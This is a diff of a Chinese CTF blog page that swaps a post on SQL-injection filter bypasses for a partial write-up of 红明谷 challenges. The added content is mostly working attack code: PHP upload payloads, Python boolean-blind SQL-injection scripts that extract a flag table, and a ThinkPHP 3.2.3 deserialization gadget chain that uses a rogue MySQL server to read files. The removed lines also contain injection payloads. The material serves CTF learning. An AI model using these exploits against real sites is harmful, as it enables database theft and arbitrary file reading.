@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL绕过姿势, Keep-Boom">
+    <meta name="keywords" content="红明谷部分wp, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL绕过姿势 | Keep-Boom</title>
+    <title>红明谷部分wp | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL绕过姿势</h1>
+                    <h1 class="description center-align post-title">红明谷部分wp</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-09
+                    2021-04-04
                 </div>
                 
 
@@ -459,23 +459,149 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><p>利用join</p>
-<p>select 1,2,3 == select * from (select 1)a join (select 2)b join (select 3)c</p>
-<p>题目练习：百度杯9月份sqli（春秋平台）</p>
-<h3 id="select-from-‘admin’-where-password-md5-pass-true"><a href="#select-from-‘admin’-where-password-md5-pass-true" class="headerlink" title="select * from ‘admin’ where password=md5($pass,true)"></a>select * from ‘admin’ where password=md5($pass,true)</h3><pre><code>ffifdyop
+                <h3 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h3><p><img src="/images/70.png"></p>
+<p>payload</p>
+<p>短标签绕过</p>
+<pre><code>&lt;?=?&gt;  等价于  &lt;? echo ?&gt;
+空格绕过 这里很多都可以绕过，注意转义！如\$IFS\$1
+?action=upload&amp;data=&lt;?=`cat%09/!wahtyouwant401*`?&gt;</code></pre>
+<p>payload</p>
+<pre><code>file_put_contents可以传入数组
+?action=upload&amp;data[]=&lt;?ph&amp;data[]=p%0Aph&amp;data[]=pinfo()%0A?&gt;</code></pre>
+<h3 id="happysql"><a href="#happysql" class="headerlink" title="happysql"></a>happysql</h3><p>注入点在登录处</p>
+<p>过滤了等号可以用in，regexp代替，空格可以用/**/等方法绕过，information可以用mysql.innodb_table_stats绕过爆出库和表</p>
+<p>大佬的exp</p>
+<pre><code>from binascii import *
+import requests
 
-129581926211651571912466741651878684928</code></pre>
-<pre><code>echo md5(&#39;ffifdyop&#39;,true);
-//&#39;or&#39;6�]��!r,��b
-select * from &#39;admin&#39; where password=md5($pass,true);
-//select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6.......&#39;</code></pre>
-<h3 id="GYCTF2020-Blacklist堆叠注入"><a href="#GYCTF2020-Blacklist堆叠注入" class="headerlink" title="[GYCTF2020]Blacklist堆叠注入"></a>[GYCTF2020]Blacklist堆叠注入</h3><p><img src="D:\boke\blog\source\images\63.png"></p>
-<p>比强网杯过滤更严格。</p>
-<p>官方payload：</p>
-<pre><code>1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></pre>
-<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
-<pre><code>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST </code></pre>
-<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）</p>
+ascii_str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;
+url = &#39;http://eci-2ze6jljai3r43tjxt13k.cloudeci1.ichunqiu.com/login.php&#39;
+
+headers = &#123;&#39;Host&#39;: &#39;eci-2ze6jljai3r43tjxt13k.cloudeci1.ichunqiu.com/&#39;,
+               &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&#39;,
+               &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;,
+               &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
+               &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;,
+               &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;&#125;
+
+text = &#39;&#39;
+for i in range(1,50):
+    for s in ascii_str:
+        username = &#39;1&quot;||hex(left((select/**/*/**/from/**/ctf.f1ag),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#&#39;.format(i,hexlify((text+s).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;).upper())
+        payload = &#123;&quot;username&quot;: username,&quot;password&quot;: &quot;mochu7&quot;&#125;
+        res = requests.post(url=url,headers=headers,data=payload)
+        if &#39;home.php&#39; in res.text:
+            text += s
+            print(text)
+</code></pre>
+<pre><code>1&quot;||hex(left(version(),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#
+
+1&quot;||hex(left((select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#
+
+1&quot;||hex(left((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/(database_name)in(database())),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#
+
+1&quot;||hex(left((select/**/*/**/from/**/ctf.f1ag),&#123;&#125;))in(&quot;&#123;&#125;&quot;)#</code></pre>
+<p>本地sql靶场测试的exp</p>
+<pre><code>import binascii
+import requests
+rq = requests.session()
+url = &quot;http://127.0.0.1/Less-2/?id=-1||hex(left((select/**/database()),&#123;&#125;))in(&#39;&#123;&#125;&#39;)--+&quot;
+flag = &#39;&#39;
+ascii_str =&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;
+for i in range(1,30):
+    for j in ascii_str:
+        rp = rq.get(url.format(i,binascii.b2a_hex(flag+j)))
+        if &quot;Dumb&quot; in rp.text:
+            flag += j
+            print(flag)</code></pre>
+<pre><code>import requests
+import string
+rq = requests.session()
+url = &quot;http://127.0.0.1/Less-2/?id=-1||locate(binary&#39;&#123;&#125;&#39;,(select/**/database()))in(&#123;&#125;)--+&quot;
+flag = &#39;&#39;
+ascii_str = string.printable
+for i in range(1,30):
+    for j in ascii_str:
+        rp = rq.get(url.format(j,i))
+        if &quot;Dumb&quot; in rp.text:
+            flag += j
+            print(flag)</code></pre>
+<pre><code>binary 可以用来区分大小写
+locate(a,b) a在b第一次出现的位置</code></pre>
+<h3 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h3><p>考察的是（tp3.2.3反序列化进行任意文件读取，SQL注入）</p>
+<p><strong>注意搭建环境时的php版本选择5.多的</strong></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">tp3.2.3反序列化参考文章</a></p>
+<p>可以自己在本地下载tp3.2.3进行验证，亲身体验会有不一样的感觉。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server/">架设恶意mysql服务脚本</a></p>
+<p>由于mysql客户端绝对信任服务端。导致攻击机可以构造一个恶意服务端，在连接的时候发送读取文件的请求，然后返回的结果会被记录到mysql.log</p>
+<p>exp</p>
+<pre><code>&lt;?php
+namespace Think\Db\Driver&#123;
+    use PDO;
+    class Mysql&#123;
+        protected $options = array(
+            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // 开启才能读取文件
+        );
+        protected $config = array(
+            &quot;debug&quot;    =&gt; 1,
+            &quot;database&quot; =&gt; &quot;&quot;,
+            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,
+            &quot;hostport&quot; =&gt; &quot;3307&quot;,
+            &quot;charset&quot;  =&gt; &quot;utf8&quot;,
+            &quot;username&quot; =&gt; &quot;root&quot;,
+            &quot;password&quot; =&gt; &quot;&quot;
+        );
+    &#125;
+&#125;
+
+namespace Think\Image\Driver&#123;
+    use Think\Session\Driver\Memcache;
+    class Imagick&#123;
+        private $img;
+
+        public function __construct()&#123;
+            $this-&gt;img = new Memcache();
+        &#125;
+    &#125;
+&#125;
+
+namespace Think\Session\Driver&#123;
+    use Think\Model;
+    class Memcache&#123;
+        protected $handle;
+
+        public function __construct()&#123;
+            $this-&gt;handle = new Model();
+        &#125;
+    &#125;
+&#125;
+
+namespace Think&#123;
+    use Think\Db\Driver\Mysql;
+    class Model&#123;
+        protected $options   = array();
+        protected $pk;
+        protected $data = array();
+        protected $db = null;
+
+        public function __construct()&#123;
+            $this-&gt;db = new Mysql();
+            $this-&gt;options[&#39;where&#39;] = &#39;&#39;;
+            $this-&gt;pk = &#39;id&#39;;
+            $this-&gt;data[$this-&gt;pk] = array(
+                &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;,
+                &quot;where&quot; =&gt; &quot;1=1&quot;
+            );
+        &#125;
+    &#125;
+&#125;
+
+namespace &#123;
+    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
+&#125;</code></pre>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://mochu.blog.csdn.net/article/details/115410705">https://mochu.blog.csdn.net/article/details/115410705</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1MTkwMTY1NQ==&mid=2247489306&idx=1&sn=9bbbf8f0df5f1f3df9eb75ae89191969&chksm=fb8b17a2ccfc9eb46aaee123dc9cee324651f256f066669bab0cf2db177798482d6241839dc3&xtrack=1&scene=90&subscene=93&sessionid=1617467772&clicktime=1617467775&enterid=1617467775&ascene=56&devicetype=android-29&version=2800023b&nettype=cmnet&abtest_cookie=AAACAA==&lang=en&exportkey=AWQ1imExH4RDcHkdVG1vGfM=&pass_ticket=mDbyZRyUjptMeAN0jfo3+ovzcy0k2ISLV6ClVlWqxNdd1F4ha7aQX9gbqKC/C+oJ&wx_header=1">文章二</a></p>
 
             </div>
             <hr/>
@@ -501,7 +627,7 @@ select * from &#39;admin&#39; where password=md5($pass,true);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/03/09/SQL%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">http://example.com/2021/03/09/SQL%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a>
+                    <a href="http://example.com/2021/04/04/%E7%BA%A2%E6%98%8E%E8%B0%B7%E9%83%A8%E5%88%86wp/">http://example.com/2021/04/04/%E7%BA%A2%E6%98%8E%E8%B0%B7%E9%83%A8%E5%88%86wp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -706,54 +832,18 @@ select * from &#39;admin&#39; where password=md5($pass,true);
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/03/10/%E7%99%BE%E5%BA%A6%E6%9D%AF-code/">
+                <a href="/2021/04/04/%E7%BA%A2%E6%98%8E%E8%B0%B7%E9%83%A8%E5%88%86wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="百度杯-code">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="红明谷部分wp">
                         
-                        <span class="card-title">百度杯-code</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-10
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Chan.Joy
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/03/08/%E7%99%BE%E5%BA%A6%E6%9D%AF9%E6%9C%88%E4%BB%BDYeserCMS/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="百度杯9月份YeserCMS">
-                        
-                        <span class="card-title">百度杯9月份YeserCMS</span>
+                        <span class="card-title">红明谷部分wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -764,7 +854,45 @@ select * from &#39;admin&#39; where password=md5($pass,true);
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Chan.Joy
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/03/29/dasctf%E9%83%A8%E5%88%86wp/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="dasctf部分wp">
+                        
+                        <span class="card-title">dasctf部分wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-29
                             </span>
                         <span class="publish-author">
                             
